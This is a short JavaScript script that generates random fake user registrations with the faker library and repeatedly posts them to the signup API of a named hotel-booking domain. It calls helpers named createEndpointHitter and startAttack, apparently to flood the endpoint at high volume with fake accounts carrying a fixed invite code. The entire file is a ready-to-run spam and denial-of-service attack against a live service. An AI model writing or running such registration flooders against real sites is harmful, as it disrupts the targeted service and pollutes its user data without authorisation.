import { faker } from "@faker-js/faker";
import { createEndpointHitter, startAttack } from "./utils.js";

const API_URL = "https://www.globalhotelrunner.com/api/user/register";

// Function to generate random payload
const generatePayload = () => {
  const password = faker.internet.password({ length: 8 });
  // Generate random length between 9 and 12
  const length = Math.floor(Math.random() * 4) + 9;
  const mobileNumber = "081" + faker.string.numeric(length - 2);
  return {
    username: faker.internet.username(),
    mobile: mobileNumber,
    password: password,
    password_confirmation: password,
    transaction_password: faker.internet.password({ length: 8 }),
    sex: Math.floor(Math.random() * 2) + 1,
    invite_code: 315648,
  };
};

const hitEndpoint = createEndpointHitter(API_URL, generatePayload);
startAttack(hitEndpoint, 2000);
